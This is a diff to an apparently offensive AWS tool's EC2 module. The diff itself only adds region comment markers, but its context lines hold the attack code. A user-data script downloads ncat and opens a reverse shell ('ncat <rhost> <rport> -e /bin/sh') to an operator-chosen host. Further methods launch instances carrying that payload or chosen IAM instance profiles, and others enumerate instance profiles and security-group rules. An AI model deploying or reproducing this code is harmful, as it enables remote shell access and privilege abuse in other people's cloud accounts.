@@ -13,6 +13,7 @@ sudo apt update
 wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -O /tmp/ncat
 chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
     
+    # [START _create_key_pair]
     def _create_key_pair(self, key_name: str):
         def _create(key_name: str, dry: bool=True):
             try:
@@ -51,7 +52,9 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
                 exit(1)
         else:
             self.console.print("You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")
+    # [END _create_key_pair]
 
+    # [START _run_instance]
     def _run_instance(
         self, key_name: str = "", ami_id: str = "", security_groups_ids: list = [],
         subnet_id: str = "", instance_type: str = "", instance_profile_arn: str = "",
@@ -95,7 +98,9 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
         except ClientError:
             self.console.log("An error occured while attempting to retrieve instance public IP address.. ([red]ERROR[/red])")
             exit()
+    # [END _run_instance]
 
+    # [START launch_ec2_with_instance_profile]
     def launch_ec2_with_instance_profile(
         self, key_name: str, ami_id: str, security_group_ids: list,
         subnet_id: str, instance_type: str, instance_profile_arn: str
@@ -103,7 +108,9 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
         self._create_key_pair(key_name)
         sleep(1)
         self._run_instance(key_name, ami_id, security_group_ids, subnet_id, instance_type, instance_profile_arn)
+    # [END launch_ec2_with_instance_profile]
 
+    # [START user_data_rev_shell]
     def user_data_rev_shell(self, ami_id: str, instance_type: str, rhost: str, rport: int):
         self.console.print("Creating reverse shell user data script.. ([blue]INFO[/blue])")
         self.user_data_payload = self.user_data_payload.replace("<rhost>", rhost)
@@ -114,7 +121,9 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
         self.console.print("Running instance with reverse shell user data script.. ([green]OK[/green])")
         self._run_instance(ami_id=ami_id, instance_type=instance_type, user_data=self.user_data_payload)
         self.console.print("\nCheck your TCP listener after a minute or two for a callback.. ([red]ACTION[/red])")
+    # [END user_data_rev_shell]
 
+    # [START get_instance_profiles]
     def get_instance_profiles(self):
         instance_ids = []
         profiles = []
@@ -122,7 +131,9 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
             instance_ids.append(profile["InstanceId"])
             profiles.append(profile["IamInstanceProfile"]["Arn"])
         return list(zip(instance_ids, profiles))
+    # [END get_instance_profiles]
     
+    # [START get_security_groups]
     def get_security_groups(self):
         for security_group in self.ec2.describe_security_groups()["SecurityGroups"]:
             for rule in security_group["IpPermissions"]:
@@ -141,3 +152,4 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
                     " "*3, f"\u2022 From {str(cidrs)}::{rule['FromPort']}",
                     "\u2192", f"::{rule['ToPort']}", f"([bold yellow]ALLOW[/bold yellow])\n"
                 )
+    # [END get_security_groups]
